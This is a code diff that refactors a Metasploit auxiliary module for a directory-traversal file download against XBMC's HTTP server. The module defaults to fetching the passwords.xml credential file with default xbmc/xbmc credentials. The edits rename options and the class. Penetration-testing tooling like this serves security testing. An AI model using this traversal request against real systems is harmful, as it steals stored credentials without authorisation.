@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -38,9 +35,9 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('FILEPATH', [false, 'The name of the file to download', '/private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml']),
         OptInt.new('DEPTH', [true, 'The max traversal depth', 9]),
-        OptString.new('USERNAME', [true, 'The username to use for the HTTP server', 'xbmc']),
-        OptString.new('PASSWORD', [false, 'The password to use for the HTTP server', 'xbmc']),
-      ], self.class)
+        OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'xbmc']),
+        OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'xbmc']),
+      ])
   end
 
   def run
@@ -56,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_raw({
         'method' => 'GET',
         'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
-        'authorization' => basic_auth(datastore['USERNAME'],datastore['PASSWORD'])
+        'authorization' => basic_auth(datastore['HttpUsername'],datastore['HttpPassword'])
       }, 25)
     rescue Rex::ConnectionRefused
       print_error("#{rhost}:#{rport} Could not connect.")
